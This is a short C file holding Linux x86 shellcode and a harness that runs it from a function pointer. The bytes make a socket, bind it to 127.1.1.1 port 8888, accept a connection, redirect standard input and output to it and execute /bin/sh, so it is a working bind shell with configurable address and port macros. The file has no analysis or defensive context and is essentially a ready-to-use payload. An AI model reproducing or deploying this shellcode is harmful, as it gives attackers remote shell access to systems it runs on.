#include <stdio.h>

/*
 ipaddr 127.1.1.1 (0101017f)
 port 8888 (b822)
*/
#define IPADDR "\x7f\x01\x01\x01"
#define PORT "\x22\xb8"
 
char *shellcode = "\x31\xc0\xb0\x66\x31\xdb\x53\x6a\x01\x6a\x02\xb3\x01\x89\xe1\xcd\x80\x89\xc7\x68"IPADDR"\x66\x68"PORT"\x66\x6a\x02\x89\xe6\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc0\x50\xb0\x66\x31\xdb\xb3\x04\x57\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x50\x50\x57\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc6\x6a\x3f\x58\x89\xf3\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x0b\x58\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"; 
 
 int main(){
     int (*ret)();
     ret = (int(*)())shellcode;
     ret();
 
     return 0;
 }